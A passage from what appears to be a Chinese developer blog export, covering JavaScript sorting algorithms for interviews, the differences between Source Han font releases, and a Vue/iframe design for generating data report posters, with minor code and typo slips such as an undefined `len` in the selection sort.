arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> current = arr[i];</span><br><span class="line">    <span class="keyword">let</span> preIndex = i - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (preIndex &gt;= <span class="number">0</span> &amp;&amp; current &lt; arr[preIndex]) &#123;</span><br><span class="line">      arr[preIndex + <span class="number">1</span>] = arr[preIndex];</span><br><span class="line">      preIndex--;</span><br><span class="line">    &#125;</span><br><span class="line">    arr[preIndex + <span class="number">1</span>] = current;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">起始输入：</span><br><span class="line">[5, 2, 1, 6, 7]</span><br><span class="line"></span><br><span class="line">排序过程：</span><br><span class="line">i = 1, preIndex = 0, current = 2, arr[preIndex] = 5</span><br><span class="line">sorting arr: [5, 5, 1, 6, 7]</span><br><span class="line">sorted arr: [2, 5, 1, 6, 7]</span><br><span class="line"></span><br><span class="line">i = 2, preIndex = 1, current = 1, arr[preIndex] = 5</span><br><span class="line">sorting arr: [2, 5, 5, 6, 7]</span><br><span class="line">sorting arr: [2, 2, 5, 6, 7]</span><br><span class="line">sorted arr: [1, 2, 5, 6, 7]</span><br><span class="line"></span><br><span class="line">i = 3, preIndex = 2, current = 6, arr[preIndex] = 5</span><br><span class="line">sorted arr: [1, 2, 5, 6, 7]</span><br><span class="line"></span><br><span class="line">i = 4, preIndex = 3, current = 7, arr[preIndex] = 6</span><br><span class="line">sorted arr: [1, 2, 5, 6, 7]</span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：O(n^2)</li><li>空间复杂度：O(1)</li></ul><h3 id="稳定性-1"><a href="#稳定性-1" class="headerlink" title="稳定性"></a>稳定性</h3><p>稳定，当插入排序遍历数组时，如果当前元素与已排序部分的某个元素相等，它会被插入到该元素的后面，而不是前面，因此相同元素的相对顺序保持不变。</p><h3 id="最坏情况-1"><a href="#最坏情况-1" class="headerlink" title="最坏情况"></a>最坏情况</h3><p>插入排序的最坏情况发生在输入数组是逆序排列时。也就是说，当输入数组中的元素按照递减的顺序排列时，插入排序的性能会达到最差。</p><p>在这种情况下，每个新元素都必须与已排序部分的每个元素进行比较，并且需要执行最大数量的移动操作才能将其插入到正确的位置。这导致插入排序的时间复杂度达到 O(n^2)，其中 n 是数组的大小。</p><p>因此，插入排序在面对逆序排列的数组时效率较低，这也是其在处理大规模数据时不够高效的原因之一。</p><h1 id="3-选择排序"><a href="#3-选择排序" class="headerlink" title="3. 选择排序"></a>3. 选择排序</h1><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。重复第二步，直到所有元素均排序完毕。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/Selection-Sort-Animation.gif" alt=""></p><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">selectionSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> minIndex;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    minIndex = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[j] &lt; arr[minIndex]) &#123;</span><br><span class="line">        <span class="comment">// 寻找最小的数</span></span><br><span class="line">        minIndex = j;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [arr[i], arr[minIndex]] = [arr[minIndex], arr[i]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">起始输入：</span><br><span class="line">[5, 2, 7, 6, 1]</span><br><span class="line"></span><br><span class="line">排序过程：</span><br><span class="line">i = 0, sortedArr = [], waitArr = [5, 2, 7, 6, 1]</span><br><span class="line">minIndex = 4, arr[minIndex] = 1 =&gt; [5, 2, 7, 6, 1] -&gt; [1, 2, 7, 6, 5]</span><br><span class="line"></span><br><span class="line">i = 1, sortedArr = [1], waitArr = [2, 7, 6, 5]</span><br><span class="line">minIndex = 1, arr[minIndex] = 2 =&gt; [1, 2, 7, 6, 5] -&gt; [1, 2, 7, 6, 5]</span><br><span class="line"></span><br><span class="line">i = 2, sortedArr = [1, 2], waitArr = [7, 6, 5]</span><br><span class="line">minIndex = 4, arr[minIndex] = 5 =&gt; [1, 2, 7, 6, 5] -&gt; [1, 2, 5, 6, 7]</span><br><span class="line"></span><br><span class="line">i = 3, sortedArr = [1, 2, 5], waitArr = [6, 7]</span><br><span class="line">minIndex = 3, arr[minIndex] = 6 =&gt; [1, 2, 5, 6, 7] -&gt; [1, 2, 5, 6, 7]</span><br></pre></td></tr></table></figure><h3 id="复杂度-2"><a href="#复杂度-2" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：O(n^2)</li><li>空间复杂度：O(1)</li></ul><h3 id="稳定性-2"><a href="#稳定性-2" class="headerlink" title="稳定性"></a>稳定性</h3><p>不稳定，在选择排序中，由于每次选择最小（或最大）元素并将其交换到正确的位置（如 [5, 2, 5, 1, 3] 排序时第一个元素 5 可能与元素 1 交换位置），可能会破坏相同元素之间的相对顺序。因此，选择排序不是稳定的排序算法。</p><h3 id="最坏情况-2"><a href="#最坏情况-2" class="headerlink" title="最坏情况"></a>最坏情况</h3><p>选择排序无论什么数据进去都是 O(n²) 的时间复杂度。所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间。</p><h1 id="4-快速排序"><a href="#4-快速排序" class="headerlink" title="4. 快速排序"></a>4. 快速排序</h1><p>快速排序由C. A. R. Hoare在1960年提出。它的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403231952408.png" alt=""></p><h3 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">quickSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (arr.<span class="property">length</span> &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> left = [];</span><br><span class="line">  <span class="keyword">const</span> right = [];</span><br><span class="line">  <span class="keyword">const</span> mid = arr[arr.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] &lt; mid) &#123;</span><br><span class="line">      left.<span class="title function_">push</span>(arr[i]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      right.<span class="title function_">push</span>(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> [...<span class="title function_">quickSort</span>(left), mid, ...<span class="title function_">quickSort</span>(right)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="复杂度-3"><a href="#复杂度-3" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：O(nlog2n)</li></ul><h3 id="稳定性-3"><a href="#稳定性-3" class="headerlink" title="稳定性"></a>稳定性</h3><p>不稳定，在快速排序中，对元素的比较和交换是在不同位置上进行的，这可能导致相同元素的相对顺序发生改变。</p><h3 id="最坏情况-3"><a href="#最坏情况-3" class="headerlink" title="最坏情况"></a>最坏情况</h3><p>快速排序算法的最坏情况发生在每次划分都选取的枢轴元素都是当前子数组中的最小（或最大）元素的情况下。这样的情况导致每次划分都只能将数组分成一个子数组和一个空数组，从而使得递归的深度达到最大值。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>带你看懂思源字体的各个版本都有什么区别</title>
      <link href="/2024/02/d54f000429f5.html"/>
      <url>/2024/02/d54f000429f5.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>思源字体是 Adobe 提供的一套开源字体，包含了 <a href="https://github.com/adobe-fonts/source-han-sans">思源黑体 source-han-snas</a>，<a href="https://github.com/adobe-fonts/source-han-serif">思源宋体 source-han-serif</a>，<a href="https://github.com/adobe-fonts/source-han-mono">思源等宽 source-han-mono</a>。其开源协议允许商业用途，同时允许对其进行修改，因此非常适合使用。</p><p>我们以思源黑体为例，当我们打开其 Release 页面，可能并不知道我们所需要下载什么：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402231815044.png" alt=""></p><p>官方也提供了一个『简要』的下载说明，也会让人看的一头雾水：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402231817905.png" alt=""></p><h1 id="2-首先，我们先来分清一下什么是-OTF-与-OTC"><a href="#2-首先，我们先来分清一下什么是-OTF-与-OTC" class="headerlink" title="2. 首先，我们先来分清一下什么是 OTF 与 OTC"></a>2. 首先，我们先来分清一下什么是 OTF 与 OTC</h1><p>OTF 全称 OpenType Font，OTF 全称 OpenType Collection。两者的前缀 OpenType 是一个现代化的字体规范，由微软和 Adobe 开发，它是一个跨平台的字体规范文件，因此对于操作系统来说，通常下载 OT* 的字体。</p><p>OTF 字体文件后缀为 <code>.otf</code>，在 Release 的 OTF 目录下可以找到根据特定语言版本区分的 OTF 文件，同时该目录下单个特定语言版本又包含了从 ExtraLight 到 Heavy 多个字重的字体文件：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402231841752.png" alt=""></p><p>OTC 字体在思源黑体中后缀为<code>.ttc/.otc</code>，其是对于 OTF 的打包封装，一个字体档中可以存在多个字形，在思源黑体中，OTC 对所有的<strong>特定语言</strong>的<strong>不同字重</strong>的文件进行了打包，从而生成了如下几个文件：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402231851531.png" alt=""></p><p>OTC 字体的好处是在互联网上进行分发时，用户只需要下载一个文件就可以获取到整个系列的字体来使用，例如 MacOS 中打开 OTC 字体时就可以选择多个字形、字重来进行安装：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402231906714.png" alt=""></p><p>此外，思源字体还提供了 SuperOTC 版本，该字体版本是将所有的特定语言版本、字重版本的字体文件都打包在一个字体文件中了。</p><h1 id="3-特定语言版本、地区子集版本"><a href="#3-特定语言版本、地区子集版本" class="headerlink" title="3. 特定语言版本、地区子集版本"></a>3. 特定语言版本、地区子集版本</h1><p>当我们下载 OTF 字体时，会发现下载下来的字体是以语言体系为分类命名的，如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402252050159.png" alt=""></p><p>此外还有一个 SubsetOTF，这个文件夹中的字体是以地区为分类命名的，如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402252050251.png" alt=""></p><p>这就是思源字体的两种字形分类方式，按照『特定语言版本』分类，和按照『地区子集』分类，各个分类的具体区别如下：</p><h3 id="特定语言版本"><a href="#特定语言版本" class="headerlink" title="特定语言版本"></a>特定语言版本</h3><table><thead><tr><th>分类</th><th>说明</th><th>字体名</th></tr></thead><tbody><tr><td>Japanese</td><td>日文</td><td>SourceHanSans</td></tr><tr><td>Korean</td><td>韩文</td><td>SourceHanSansK</td></tr><tr><td>SimplifiedChinese</td><td>简体中文</td><td>SourceHanSansSC</td></tr><tr><td>TraditionalChinese</td><td>繁体中文</td><td>SourceHanSansTC</td></tr><tr><td>TraditionalChineseHK</td><td>繁体中文（香港）</td><td>SourceHanSansHC</td></tr><tr><td>特定语言版本的思源字体包含了所有地区写法的字形（字符数 65535 个），各个版本的大小一致，区别仅在于默认的语言版本不同，因此下载这个版本的字体是基本不存在『缺字』的情况的。</td><td></td><td></td></tr></tbody></table><p>不同语言版本的字形区别很细微，借用 <a href="https://zhuanlan.zhihu.com/p/526734630">知乎 - 思源黑体版本指南</a> 文中的示例：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402252200156.png" alt=""></p><p>由于特定语言版本的字体拥有所有的字形，因此可以利用 OpenType 的 locla 特性，在能够侦测语言的环境中自动切换地区字形。举例来说，当我们在 web 页面中中，如果 html  的 <code>lang</code> 属性设置为了 <code>zh-CN</code> 那么我们字体无论使用的是 SourceHanSansK 还是 SourceHanSansTC，字形都会被切换为『简体中文』，也就是 『SourceHanSansSC』的默认字形；类似的，如果设置为了  <code>zh-HK</code>，那么字形就会被切换为『繁体中文（香港）』，也就是『TraditionalChineseHK』的默认字形；但是如果设置的 <code>lang</code> 无法被识别为一个有效的地区，如 <code>en-US</code>，那么不同的字体就会使用默认的语言版本，如 SourceHanSansSC 字体使用『简体中文』，TraditionalChineseHK 使用『繁体中文（香港）』。</p><h3 id="地区子集版本"><a href="#地区子集版本" class="headerlink" title="地区子集版本"></a>地区子集版本</h3><table><thead><tr><th>地区</th><th>说明</th><th>字体名</th></tr></thead><tbody><tr><td>CN</td><td>简体中文（大陆）</td><td>SourceHanSansCN</td></tr><tr><td>HK</td><td>繁体中文（香港）</td><td>SourceHanSansHK</td></tr><tr><td>TW</td><td>繁体中文（台湾）</td><td>SourceHanSansTW</td></tr><tr><td>JP</td><td>日文</td><td>SourceHanSansJP</td></tr><tr><td>KR</td><td>韩文</td><td>SourceHanSansKR</td></tr></tbody></table><p>地区子集版本的字体文件仅包含对应地区的字形，比如 JP、KR 仅包含了部分汉字，HK、TW 不包含简体与日文中的部分汉字，标点符号只存在一种该地区规范的字形，示例如下（未加粗的字体表示当前地区子集的字体中不包含该字形）：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402252218807.png" alt=""></p><p>使用地区子集字体的好处是由于精简了不必要的字形，因此字体文件相对较小，比较适合在网页、嵌入式开发这类对体积敏感的场合使用。</p><h1 id="4-可变字体-Variable-Fonts"><a href="#4-可变字体-Variable-Fonts" class="headerlink" title="4. 可变字体 Variable Fonts"></a>4. 可变字体 Variable Fonts</h1><p>在思源黑体的 Release 目录下，除了 OTF、OTC 字体文件之外，还有一个 Variable 文件夹（在下载资源里为 VF），该目录下的字体没有以字重作为区分，因为其利用了 OpenType 1.8 的可变字体特性。在该特性下，字体没有固定的字重，字体的粗细是可以无极调节的。在 web 中，这种字体可以使用 <code>font-weight</code> 来调整字重，而静态字体是无法通过样式来调整字重的。</p><p>关于更多可变字体的说明，可参考<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E5%8F%98%E5%AD%97%E4%BD%93">维基百科</a>。</p><h1 id="5-OpenType-与-TrueType"><a href="#5-OpenType-与-TrueType" class="headerlink" title="5. OpenType 与 TrueType"></a>5. OpenType 与 TrueType</h1><p>在前面我们介绍 OTF 与 OTC 时已经简单讲了 OpenType 是一种字体规范，当我们在 css 中声明 font-face 时在添加 OTF 字体时也会声明字体格式为 <code>oepntype</code>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line"><span class="attribute">font-family</span>: <span class="string">&quot;otf-SimplifiedChinese-bold&quot;</span>;</span><br><span class="line"><span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&quot;./fonts/otf/SimplifiedChinese/SourceHanSansSC-Bold.otf&quot;</span>)</span><br><span class="line">  <span class="built_in">format</span>(<span class="string">&quot;opentype&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时还存在另外一种字体标准 TrueType，其文件后缀格式为 <code>.ttf</code>，这两种字体标准的关系还要从起发展讲起。</p><p>在最初，计算机字体都是有一个个像素点拼凑的点阵文字，随着计算机分辨率的提升以及印刷技术的发展，Adobe 发明了 PostScript，让计算机可以使用向量描述字体，使得字体变得平滑，此时的字体规范为 PostScript Type1。由于 Adobe 不愿意把 PostScript 提供给 Apple，因此 Apple 和 Microsoft 在 1989 年合作推出了 TrueType，目的就是为了替代 Adobe 的 PostScript Type1 规范。然而到了 1997 年，微软又反水找到了 Adobe 合作，推出了 OpenType 规范，并提交给了 ISO 组织，成为了国际上的通用字体规范标准发展至今。</p><p>到这里你或许会觉得 OpenType 只不过是比 TrueType 更新的一个标准，但事实上还是有亿点复杂的：</p><ul><li>首先，OpenType 是基于 TrueType Open 的，并且被设计为向上兼容，因此可以将 OpenType 看做为 TrueType 的一个扩展标准，而并不是全新的一个标准。</li><li>其次，<strong>现代化的 TrueType 字体都必须遵循 OpenType 规范</strong>，因此对于那些符合 OpenType 规范的 TrueType 字体来说，<code>.ttf</code> 格式的扩展名甚至可以换成 <code>.otf</code>，在 css 中声明 <code>font-family</code> 时对 <code>.ttf</code> 扩展的字体使用 <code>format(&#39;oepntype&#39;)</code> 也是合适的。</li><li>此外，TrueType 在技术实现上使用了二次贝塞尔曲线来描述字体轮廓，而 OpenType 规范下既允许使用二次贝塞尔曲线，又允许使用  PostSCript Type 1 的三次贝塞尔曲线，但不能仅通过扩展名来区分字体轮廓使用了哪种贝塞尔曲线。</li><li>最后，尽管 OpenType 更优越，TrueType 由于进入市场较早，更多人熟悉创建 TrueType 字体的过程，因此无论是资源数量还是流行度上都更占优势。</li></ul><p>最后附上一张图，展示了 TrueType 和 OpenType 的包含关系：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402252339060.png" alt=""></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul><li>HW：等宽字体，字符宽度都相同的电脑字体，简单理解为两个英文单次宽度等同于一个中文字符。</li><li>WOFF：Web 开放字体格式，字体文件后缀为 <code>.woff</code>，采用了压缩格式，在网络传输中更占优势，其可以由 TTF 与 OTF 字体封装得来。</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.ziti163.com/item/2859">https://www.ziti163.com/item/2859</a></li><li><a href="https://zhuanlan.zhihu.com/p/26534789">https://zhuanlan.zhihu.com/p/26534789</a></li><li><a href="https://askanydifference.com/zh-CN/difference-between-opentype-and-truetype/">https://askanydifference.com/zh-CN/difference-between-opentype-and-truetype/</a></li><li><a href="https://www.mindscmyk.com/2021/02/26/project-knowledge-27-ttf-otf-ttc/">https://www.mindscmyk.com/2021/02/26/project-knowledge-27-ttf-otf-ttc/</a></li><li><a href="https://zhuanlan.zhihu.com/p/526734630">https://zhuanlan.zhihu.com/p/526734630</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 技术调研 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据报告海报生成图片、PDF方案的技术调研</title>
      <link href="/2024/02/a59d62597b50.html"/>
      <url>/2024/02/a59d62597b50.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-需求梳理"><a href="#1-需求梳理" class="headerlink" title="1. 需求梳理"></a>1. 需求梳理</h1><p>现存在一个需求，要求用户可以通过控制左侧的表单选项，在右侧实时展示为用户生成的数据海报，在用户调整完毕后，可以生成共享链接、图片、PDF 三种可分享的媒体形式，整体效果如下图：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402231700518.png" alt=""></p><h1 id="2-海报的实时生成与预览"><a href="#2-海报的实时生成与预览" class="headerlink" title="2. 海报的实时生成与预览"></a>2. 海报的实时生成与预览</h1><h2 id="2-1-架构设计"><a href="#2-1-架构设计" class="headerlink" title="2.1 架构设计"></a>2.1 架构设计</h2><p>整体页面的组件拆分并不复杂，可以简单分为如下几个组件：</p><ul><li>GeneratePage：顶级父组件，承接数据获取、数据处理、子组件之间的通信等逻辑；</li><li>ControllerForm：左侧的表单控件组件，负责组织用户可操作的表单项，对外暴露 formData；</li><li>PosterRender：右侧海报的实时渲染区域，组件输入为一个结构化的渲染 Schema，内部对组件进行渲染，其渲染的内容又可以单独拆分为多个子组件；</li></ul><p>拆分完组件后我们就可以考虑数据流向问题了。首先，父组件从服务端获取生成海报的数据（dataSet）；然后，等用户操作表单从而获得表单数据（formData）；将海报数据和表单数据进行结合，生成渲染 Schema，渲染 Schema 包含了要渲染的组件名称（componentName）、为组件传递的参数（componentProps），然后 PostRender 组件就可以通过这些信息来渲染内容了，整体数据流如下图：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/%E4%BC%9A%E5%91%98%E6%B5%B7%E6%8A%A5%E7%94%9F%E6%88%90.drawio.png" alt=""></p><p>PostRender 组件负责根据 Schema 来渲染对应的组件，具体代码实现示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">import &#123; PosterSchema &#125; from &#x27;./types&#x27;;</span><br><span class="line">import ShopData from &#x27;./components/ShopData.vue&#x27;;</span><br><span class="line">import CoreData from &#x27;./components/CoreData.vue&#x27;;</span><br><span class="line"></span><br><span class="line">defineOptions(&#123;</span><br><span class="line">  name: &#x27;PostRender&#x27;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    ShopData,</span><br><span class="line">    CoreData,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const props = withDefaults(</span><br><span class="line">defineProps&lt;&#123;schema?: PosterSchema&#125;&gt;(),</span><br><span class="line">&#123;</span><br><span class="line">schema: () =&gt; (&#123;&#125;),</span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">const renderSchema = ref&lt;PosterSchema&gt;([]);</span><br><span class="line"></span><br><span class="line">const loadSchema = async () =&gt; &#123;</span><br><span class="line">  /**</span><br><span class="line">    * 加载 Schema，具体的实现取决于父组件如何向当前组件通信。</span><br><span class="line">    * 比如当前组件作为子组件给父组件，那么这里就可以通过 props 来传递 schema；</span><br><span class="line">    * 如果当前组件作为一个 iframe 嵌入到父组件，那么就使用 postMessage 来传递 schema；</span><br><span class="line">    */</span><br><span class="line">  renderSchema.value = props.schema</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">onMounted(() =&gt; &#123;</span><br><span class="line">  loadSchema();</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div</span><br><span class="line">      class=&quot;bg-red-500 text-light-50 h-30 flex flex-col items-center justify-center&quot;</span><br><span class="line">    &gt;</span><br><span class="line">      &lt;div class=&quot;text-3xl&quot;&gt;会员数据效果报告&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;border-t border-light-50 mt-2 pt-2&quot;&gt;</span><br><span class="line">        MEMBER DATA PERFORMANCE REPORT</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;component</span><br><span class="line">      :is=&quot;item.name&quot;</span><br><span class="line">      v-for=&quot;item in renderSchema&quot;</span><br><span class="line">      :key=&quot;item.name&quot;</span><br><span class="line">      v-bind=&quot;item.props&quot;</span><br><span class="line">    &gt;&lt;/component&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h2 id="3-2-将渲染区域作为-iframe-嵌入"><a href="#3-2-将渲染区域作为-iframe-嵌入" class="headerlink" title="3.2 将渲染区域作为 iframe 嵌入"></a>3.2 将渲染区域作为 iframe 嵌入</h2><p>上面的示例我们是将 PosterRender 组件作为子组件嵌入到父组件中的，但是考虑到需求中还存在生成预览链接的要求，那么 PosterRender 应该作为一个独立的页面来执行渲染逻辑而并非子组件，因此为了考虑系统的统一性，同时尽量减少不必要的工作，一个比较好的实现方案是将 PosterRender 写为一个独立的页面，同时使用 iframe 嵌入到 GeneratePage 中，而 GeneratePage 与 PosterRender 之间的通信则使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage">postMessage</a> 来进行。</p><p>GeneratePage 与 PosterRender 之间通信的示例代码如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// iframe 的链接</span></span><br><span class="line"><span class="keyword">const</span> iframeSrc = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">origin</span> + <span class="string">&#x27;... ...&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 向 iframe 通信</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">postMessage2Iframe</span> = (<span class="params">message: <span class="built_in">any</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (iframeRef.<span class="property">value</span>) &#123;</span><br><span class="line">    iframeRef.<span class="property">value</span>.<span class="property">contentWindow</span>?.<span class="title function_">postMessage</span>(</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 使用 source 字段区分来源，防止其他 message 污染通信</span></span><br><span class="line">        <span class="attr">source</span>: <span class="string">&#x27;posterGeneratePage&#x27;</span>,</span><br><span class="line">        <span class="comment">// Proxy 对象不能在 postMessage 中传递，这里的操作可以将 Proxy 对象进行序列化</span></span><br><span class="line">        